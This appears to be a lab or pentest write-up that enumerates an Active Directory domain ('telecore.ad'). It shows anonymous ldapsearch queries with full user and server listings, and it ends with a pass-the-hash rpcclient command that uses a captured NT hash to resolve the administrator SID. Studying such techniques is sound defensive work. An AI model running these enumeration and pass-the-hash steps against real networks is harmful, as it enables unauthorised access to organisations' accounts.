We will use LDAP to query the domain using “ldapsearch” as an anonymous user


``` shell
-x : simple authentication (instead of SASL)  
-H : target LDAP/S server  
-b : search base (base domain component)  
If the domain is "hello.com" then the search base is "DC=HELLO,DC=COM"  
#Query the Domain Context:  
ldapsearch -x -H ldap://10.5.2.2 -s base  
#Search all the Groups & it's attributes :  
ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=group'
```

Enumerate and check all the domain users using LDAP.

``` shell
#Search all the Users & it's attributes :  
ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user' name distinguishedName  
```

```shell
└─$ ldapsearch -x -H ldap://10.5.2.2 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=telecore,DC=ad
ldapServiceName: telecore.ad:dc01$@TELECORE.AD
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: MaxPreAuthReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=telecore,DC=ad
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=telecore,DC=ad
schemaNamingContext: CN=Schema,CN=Configuration,DC=telecore,DC=ad
namingContexts: DC=telecore,DC=ad
namingContexts: CN=Configuration,DC=telecore,DC=ad
namingContexts: CN=Schema,CN=Configuration,DC=telecore,DC=ad
namingContexts: DC=DomainDnsZones,DC=telecore,DC=ad
namingContexts: DC=ForestDnsZones,DC=telecore,DC=ad
isSynchronized: TRUE
highestCommittedUSN: 179986
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=telecore,DC=ad
dnsHostName: DC01.telecore.ad
defaultNamingContext: DC=telecore,DC=ad
currentTime: 20251121021955.0Z
configurationNamingContext: CN=Configuration,DC=telecore,DC=ad

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
 ```

USERS

``` shell
 ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user' name distinguishedName

# extended LDIF
#
# LDAPv3
# base <DC=TELECORE,DC=AD> with scope subtree
# filter: objectClass=user
# requesting: name distinguishedName 
#

# Guest, Users, telecore.ad
dn: CN=Guest,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=Guest,CN=Users,DC=telecore,DC=ad
name: Guest

# DC01, Domain Controllers, telecore.ad
dn: CN=DC01,OU=Domain Controllers,DC=telecore,DC=ad
distinguishedName: CN=DC01,OU=Domain Controllers,DC=telecore,DC=ad
name: DC01

# PKI-SRV, Win Servers, telecore.ad
dn: CN=PKI-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=PKI-SRV,OU=Win Servers,DC=telecore,DC=ad
name: PKI-SRV

# SQL-SRV, Win Servers, telecore.ad
dn: CN=SQL-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=SQL-SRV,OU=Win Servers,DC=telecore,DC=ad
name: SQL-SRV

# EX-SRV, Win Servers, telecore.ad
dn: CN=EX-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=EX-SRV,OU=Win Servers,DC=telecore,DC=ad
name: EX-SRV

# virt-admin, Users, telecore.ad
dn: CN=virt-admin,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=virt-admin,CN=Users,DC=telecore,DC=ad
name: virt-admin

# ESXI-VD, Win Servers, telecore.ad
dn: CN=ESXI-VD,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=ESXI-VD,OU=Win Servers,DC=telecore,DC=ad
name: ESXI-VD

# tel_ops1, Users, telecore.ad
dn: CN=tel_ops1,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_ops1,CN=Users,DC=telecore,DC=ad
name: tel_ops1

# tel_support01, Users, telecore.ad
dn: CN=tel_support01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_support01,CN=Users,DC=telecore,DC=ad
name: tel_support01

# tel_engineer01, Users, telecore.ad
dn: CN=tel_engineer01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_engineer01,CN=Users,DC=telecore,DC=ad
name: tel_engineer01

# tel_billing01, Users, telecore.ad
dn: CN=tel_billing01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_billing01,CN=Users,DC=telecore,DC=ad
name: tel_billing01

# Exchange Online-ApplicationAccount, Users, telecore.ad
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=Exchange Online-ApplicationAccount,CN=Users,DC=telecore,
 DC=ad
name: Exchange Online-ApplicationAccount

# SystemMailbox{1f05a927-da73-4a43-86c4-b09cf3b29d4f}, Users, telecore.ad
dn: CN=SystemMailbox{1f05a927-da73-4a43-86c4-b09cf3b29d4f},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{1f05a927-da73-4a43-86c4-b09cf3b29d4f},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{1f05a927-da73-4a43-86c4-b09cf3b29d4f}

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, telecore.ad
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, telecore.ad
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, telecor
 e.ad
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=telecore,DC=ad
distinguishedName: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334B
 B852},CN=Users,DC=telecore,DC=ad
name: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, telecore.ad
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=telecore,DC=
 ad
distinguishedName: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,
 DC=telecore,DC=ad
name: Migration.8f3e7716-2011-43e4-96b1-aba62d229136

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, telecore.ad
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=U
 sers,DC=telecore,DC=ad
name: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, telecore.ad
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, telecore.ad
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, telecore.ad
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=telecor
 e,DC=ad
distinguishedName: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=U
 sers,DC=telecore,DC=ad
name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}

# HealthMailbox062391d6ff414d9088641865db267169, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox062391d6ff414d9088641865db267169,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox062391d6ff414d9088641865db267169,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox062391d6ff414d9088641865db267169

# HealthMailboxd00a70a328b04ca894b64b95426f0293, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxd00a70a328b04ca894b64b95426f0293,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxd00a70a328b04ca894b64b95426f0293,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxd00a70a328b04ca894b64b95426f0293

# HealthMailbox32a2a0a489ac4a9ab4163f4d879cf529, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox32a2a0a489ac4a9ab4163f4d879cf529,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox32a2a0a489ac4a9ab4163f4d879cf529,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox32a2a0a489ac4a9ab4163f4d879cf529

# HealthMailbox79d6e62d99c24085930b10cacaa8bf50, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox79d6e62d99c24085930b10cacaa8bf50,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox79d6e62d99c24085930b10cacaa8bf50,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox79d6e62d99c24085930b10cacaa8bf50

# HealthMailbox9cf17399792d485ba30357d93d11f09f, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox9cf17399792d485ba30357d93d11f09f,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox9cf17399792d485ba30357d93d11f09f,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox9cf17399792d485ba30357d93d11f09f

# HealthMailboxfd08c44ec67444f8b93f71108a0e45f9, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxfd08c44ec67444f8b93f71108a0e45f9,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxfd08c44ec67444f8b93f71108a0e45f9,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxfd08c44ec67444f8b93f71108a0e45f9

# HealthMailboxa1cc1051a2034b9cada57a2258a13900, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxa1cc1051a2034b9cada57a2258a13900,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxa1cc1051a2034b9cada57a2258a13900,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxa1cc1051a2034b9cada57a2258a13900

# HealthMailboxdbbbdc7bafc941ae98eb203cb9ce7349, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxdbbbdc7bafc941ae98eb203cb9ce7349,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxdbbbdc7bafc941ae98eb203cb9ce7349,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxdbbbdc7bafc941ae98eb203cb9ce7349

# HealthMailbox4b8e41c1779346b08710db532c24c160, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox4b8e41c1779346b08710db532c24c160,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox4b8e41c1779346b08710db532c24c160,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox4b8e41c1779346b08710db532c24c160

# HealthMailbox4f5c6c55792a407c836029a4e01421c9, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailbox4f5c6c55792a407c836029a4e01421c9,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailbox4f5c6c55792a407c836029a4e01421c9,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailbox4f5c6c55792a407c836029a4e01421c9

# HealthMailboxdee46001ea0841b1bc06444ac5013991, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxdee46001ea0841b1bc06444ac5013991,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxdee46001ea0841b1bc06444ac5013991,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxdee46001ea0841b1bc06444ac5013991

# HealthMailboxa2a6d4ec248f421487d4aec6a323d9f0, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxa2a6d4ec248f421487d4aec6a323d9f0,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxa2a6d4ec248f421487d4aec6a323d9f0,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxa2a6d4ec248f421487d4aec6a323d9f0

# HealthMailboxb35a921b75dd4231bdc55df36fd84e92, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxb35a921b75dd4231bdc55df36fd84e92,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxb35a921b75dd4231bdc55df36fd84e92,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxb35a921b75dd4231bdc55df36fd84e92

# HealthMailboxbe6332542fc64ff6aaff4f061f25284d, Monitoring Mailboxes, Microsof
 t Exchange System Objects, telecore.ad
dn: CN=HealthMailboxbe6332542fc64ff6aaff4f061f25284d,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=telecore,DC=ad
distinguishedName: CN=HealthMailboxbe6332542fc64ff6aaff4f061f25284d,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=telecore,DC=ad
name: HealthMailboxbe6332542fc64ff6aaff4f061f25284d

# search reference
ref: ldap://ForestDnsZones.telecore.ad/DC=ForestDnsZones,DC=telecore,DC=ad

# search reference
ref: ldap://DomainDnsZones.telecore.ad/DC=DomainDnsZones,DC=telecore,DC=ad

# search reference
ref: ldap://telecore.ad/CN=Configuration,DC=telecore,DC=ad

# search result
search: 2
result: 0 Success

# numResponses: 39
# numEntries: 35
# numReferences: 3
```


## Enumeración de cuentas y SIDs en el dominio usando Pass-the-Hash

```
rpcclient -U 'telecore.ad/tel_engineer01%e2b1996aaff0f57bccb916265a77970e' --pw-nt-hash 10.5.2.2 -c "lookupnames administrator"

administrator S-1-5-21-1588247407-410625039-1511794522-500 (User: 1)
```




